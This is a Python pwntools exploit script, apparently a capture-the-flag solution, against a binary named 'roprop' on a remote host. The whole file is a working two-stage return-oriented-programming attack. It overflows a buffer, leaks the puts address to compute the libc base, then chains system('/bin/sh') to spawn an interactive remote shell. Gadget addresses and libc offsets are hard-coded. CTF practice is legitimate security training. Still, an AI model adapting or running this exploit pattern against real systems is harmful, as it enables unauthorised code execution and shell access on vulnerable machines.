from pwn import *

elf = context.binary = ELF('./roprop')

host = args.HOST or 'roprop.darkarmy.xyz'
port = int(args.PORT or 5002)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        #return gdb.debug([elf.path] + argv, env={"LD_PRELOAD": libc.path}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
continue
'''.format(**locals())

# -- Exploit goes here --

POP_RDI = 0x0000000000400963

p = start()
p.recvuntil('He have got something for you since late 19\'s.\n')
payload = 'A' * 88 + p64(POP_RDI) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['main'])

p.sendline(payload)
p.recv()
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info('PUTS address: {}'.format(hex(leak)))
libc_base = leak - 0x080a30
RET = 0x0000000000400646
system = libc_base + 0x04f4e0
bin_sh = libc_base + 0x1b40fa

p.recvuntil('He have got something for you since late 19\'s.\n')
payload = 'A' * 88 + p64(RET) + p64(POP_RDI) + p64(bin_sh) + p64(system)
p.sendline(payload)
p.interactive()
p.close()